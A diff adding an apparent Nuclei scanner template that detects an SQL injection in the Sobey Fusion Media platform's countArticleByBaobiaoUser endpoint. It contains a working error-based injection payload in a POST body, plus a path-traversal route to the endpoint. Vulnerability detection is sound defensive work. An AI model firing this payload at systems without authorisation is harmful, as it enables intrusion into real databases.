@@ -1,0 +1,30 @@
+id: sobey-imcmp-countarticlebybaobiaouser-sqli
+info:
+  name: Sobey Fusion Media Content Management Platform countArticleByBaobiaoUser SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/sobey-mchEditor/mch/statistics/js/../countArticleByBaobiaoUser"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "channelId=1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(1944=1944,md5({{t1}})))),0x7e),1944)&token=1&siteCode=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Sobey"
+          - "countArticleByBaobiaoUser"
+          - "~{{t2}}~"
+          - "java.sql.SQLException"
